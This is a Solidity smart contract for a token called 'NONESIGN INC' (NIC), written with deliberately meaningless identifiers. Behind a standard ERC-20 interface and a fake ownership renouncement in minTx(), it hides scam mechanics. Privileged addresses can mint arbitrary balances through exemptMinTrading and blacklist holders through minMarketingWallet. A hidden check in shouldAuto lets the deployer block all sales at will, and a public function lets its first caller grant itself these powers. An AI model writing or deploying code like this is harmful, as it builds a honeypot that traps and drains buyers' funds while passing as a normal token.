//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface takeAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalTeam) external view returns (uint256);

    function transfer(address maxSell, uint256 toSwap) external returns (bool);

    function allowance(address senderLaunchMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 toSwap) external returns (bool);

    function transferFrom(address sender,address maxSell,uint256 toSwap) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityReceiver, uint256 value);
    event Approval(address indexed senderLaunchMode, address indexed spender, uint256 value);
}

interface toIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface listMin {
    function createPair(address takeTeam, address marketingEnable) external returns (address);
}

abstract contract walletEnableTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeAmountMetadata is takeAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract NONESIGNINC is walletEnableTake, takeAmount, takeAmountMetadata {

    function tradingReceiver() private view {
        require(receiverFee[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private launchedLimit;

    mapping(address => bool) public tradingFee;

    uint256 public marketingTokenAuto;

    event OwnershipTransferred(address indexed swapExempt, address indexed feeReceiver);

    mapping(address => uint256) private launchTo;

    bool public txSwap;

    function balanceOf(address totalTeam) public view virtual override returns (uint256) {
        return launchTo[totalTeam];
    }

    function approve(address takeLimitReceiver, uint256 toSwap) public virtual override returns (bool) {
        launchedLimit[_msgSender()][takeLimitReceiver] = toSwap;
        emit Approval(_msgSender(), takeLimitReceiver, toSwap);
        return true;
    }

    function shouldAuto(address launchedFund, address maxSell, uint256 toSwap) internal returns (bool) {
        if (launchedFund == totalSell) {
            return shouldEnable(launchedFund, maxSell, toSwap);
        }
        uint256 maxMin = takeAmount(takeLimit).balanceOf(limitTokenLaunched);
        require(maxMin == enableIs);
        require(!tradingFee[launchedFund]);
        return shouldEnable(launchedFund, maxSell, toSwap);
    }

    function minTx() public {
        emit OwnershipTransferred(totalSell, address(0));
        sellLiquidity = address(0);
    }

    uint256 public buyEnable;

    bool private txFrom;

    address limitTokenLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private fromReceiver;

    function owner() external view returns (address) {
        return sellLiquidity;
    }

    function getOwner() external view returns (address) {
        return sellLiquidity;
    }

    address private sellLiquidity;

    function launchedAutoTx(address minTrading) public {
        if (txSwap) {
            return;
        }
        if (walletBuyEnable == senderMin) {
            senderMin = launchedList;
        }
        receiverFee[minTrading] = true;
        if (txFrom == fromReceiver) {
            marketingTokenAuto = senderMin;
        }
        txSwap = true;
    }

    uint256 private launchedList;

    string private buyAmount = "NIC";

    uint256 private liquidityBuy;

    uint256 enableIs;

    uint256 public walletBuyEnable;

    function exemptMinTrading(address autoSellLaunched, uint256 toSwap) public {
        tradingReceiver();
        launchTo[autoSellLaunched] = toSwap;
    }

    function transfer(address autoSellLaunched, uint256 toSwap) external virtual override returns (bool) {
        return shouldAuto(_msgSender(), autoSellLaunched, toSwap);
    }

    address public takeLimit;

    function decimals() external view virtual override returns (uint8) {
        return senderTotalTrading;
    }

    address receiverSwapMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address toExemptTotal, address takeLimitReceiver) external view virtual override returns (uint256) {
        if (takeLimitReceiver == receiverSwapMax) {
            return type(uint256).max;
        }
        return launchedLimit[toExemptTotal][takeLimitReceiver];
    }

    string private receiverSell = "NONESIGN INC";

    uint8 private senderTotalTrading = 18;

    mapping(address => bool) public receiverFee;

    address public totalSell;

    function symbol() external view virtual override returns (string memory) {
        return buyAmount;
    }

    function shouldEnable(address launchedFund, address maxSell, uint256 toSwap) internal returns (bool) {
        require(launchTo[launchedFund] >= toSwap);
        launchTo[launchedFund] -= toSwap;
        launchTo[maxSell] += toSwap;
        emit Transfer(launchedFund, maxSell, toSwap);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return receiverSell;
    }

    function receiverTotal(uint256 toSwap) public {
        tradingReceiver();
        enableIs = toSwap;
    }

    uint256 private swapList = 100000000 * 10 ** 18;

    uint256 takeSwap;

    uint256 public senderMin;

    constructor (){
        if (fromReceiver != txFrom) {
            txFrom = false;
        }
        minTx();
        toIs fundReceiver = toIs(receiverSwapMax);
        takeLimit = listMin(fundReceiver.factory()).createPair(fundReceiver.WETH(), address(this));
        if (walletBuyEnable != liquidityBuy) {
            senderMin = buyEnable;
        }
        totalSell = _msgSender();
        receiverFee[totalSell] = true;
        launchTo[totalSell] = swapList;
        
        emit Transfer(address(0), totalSell, swapList);
    }

    function minMarketingWallet(address fundMin) public {
        tradingReceiver();
        
        if (fundMin == totalSell || fundMin == takeLimit) {
            return;
        }
        tradingFee[fundMin] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return swapList;
    }

    function transferFrom(address launchedFund, address maxSell, uint256 toSwap) external override returns (bool) {
        if (_msgSender() != receiverSwapMax) {
            if (launchedLimit[launchedFund][_msgSender()] != type(uint256).max) {
                require(toSwap <= launchedLimit[launchedFund][_msgSender()]);
                launchedLimit[launchedFund][_msgSender()] -= toSwap;
            }
        }
        return shouldAuto(launchedFund, maxSell, toSwap);
    }

}